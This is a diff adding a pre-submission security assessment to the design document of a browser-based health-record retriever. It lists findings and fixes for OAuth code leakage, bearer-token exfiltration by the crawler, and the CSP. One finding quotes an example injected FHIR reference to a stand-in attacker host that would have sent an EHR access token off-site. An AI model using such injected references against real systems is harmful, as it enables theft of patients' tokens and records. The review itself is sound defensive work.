@@ -853,6 +853,65 @@ need a human with VoiceOver or NVDA. The public claim is therefore "built to mee
 with an invitation to report gaps — a defensible statement backed by a clean automated pass and
 a keyboard walkthrough, not a certification.
 
+### 9.6 Pre-submission security assessment (2026-09-01)
+
+An owner-authorised, read-only review of commit `886453d` and the live deployment. It
+confirmed the architecture holds: the Worker never receives records or tokens, the SMART flow
+is browser-to-EHR, output is a local Blob download, non-GET/HEAD returns 405, and `brandTags`
+cannot influence the redirect URI, token endpoint, or record destination.
+
+| | Finding | Disposition |
+|---|---|---|
+| C-01 | Committed `PREVIEW_TOKEN` bypasses the pre-launch gate | Accepted for now |
+| H-01 | Brand metadata rendered via `innerHTML` | Already fixed |
+| H-02 | OAuth code left in the callback URL | Fixed |
+| H-03 | Token-bearing crawler follows arbitrary absolute URLs | Fixed |
+| H-04 | CSP could be tightened | Fixed |
+| H-05 | Sandbox credentials in the public bundle | Fixed |
+
+**C-01 accepted, with the reasoning stated.** `retrieverAllowed()` returns true unconditionally
+once `EPIC_CLIENT_ID` is set, so the token stops being a control the moment the flow opens —
+the gate exists only for the closed period. The residual is real but bounded: the token is
+public in git history, so anyone reading the repository can reach the retriever SPA on the
+production origin today. That grants no access to anyone's data, because the EHR still performs
+its own authentication. If a gate is ever needed again, the value must be rotated into a
+Worker secret first; the committed one can never be reused.
+
+**H-02.** The authorization code and `state` are now stripped with `history.replaceState` the
+moment they are read, on both the success and error paths. The code is single-use and
+short-lived, but until exchanged it is a bearer credential for that patient's record, and it
+was otherwise persisting in history, copied links, screenshots, and edge logs. `replaceState`
+rather than `pushState` so Back cannot return to a URL that re-triggers the exchange.
+
+**H-03 was the most serious.** The crawler follows references and attachment URLs out of FHIR
+content, FHIR content may carry absolute URLs, and every fetch attached the bearer token. A
+resource containing `"reference": "https://attacker.example/x"` would have sent a live EHR
+access token to that host — worse than leaking the record, since the token can be replayed to
+fetch the record again. `isTokenAllowedUrl()` now requires `https:` and an origin match against
+the FHIR base, enforced at the single line that attaches the header. Off-origin URLs are
+skipped rather than fetched without the token: fetching at all would still disclose which
+resources this patient has.
+
+**H-04.** `script-src` dropped `'unsafe-inline'` — the two inline blocks moved to
+`/js/landing.js` and `/js/terms.js` — so an HTML injection that got through has no way to
+execute. `connect-src` narrowed from `*` to `https:`; it cannot be `'self'` because the
+retriever must reach whichever of ~1,300 brands the user picks, but a token must never leave
+over plaintext. Added `object-src 'none'`, `frame-src 'none'`, `Permissions-Policy` denying
+every device and sensor, and `Cross-Origin-Opener-Policy`/`Cross-Origin-Resource-Policy` at
+`same-origin` — nothing needs an opener now that record delivery is gone. `style-src` keeps
+`'unsafe-inline'`: the pages carry hundreds of `style=""` attributes and rewriting them buys
+much less than the script-src change did.
+
+**A defect the CSP work surfaced.** Moving the gate script out of the page made it testable in
+isolation, which exposed that the consent gate unlocked only when the end of the warning
+*intersected* the viewport. Jumping past it — End, a scrollbar drag, an in-page link — left the
+checkbox permanently disabled with no way to proceed. That hit reduced-motion users hardest:
+`scroll-behavior` is `auto` for them, so End jumps instantly instead of animating through the
+warning, and the page was unusable for exactly the audience the warning-first design exists to
+serve. Measured on the live page, the sentinel sat 5,071px above the viewport after such a
+jump, so the old test could never fire. The gate is now position-based: reaching *or passing*
+the end of the warning satisfies it.
+
 ## 10. Open questions
 
 - **Does the FTC Health Breach Notification Rule (16 CFR Part 318) apply?** It covers vendors
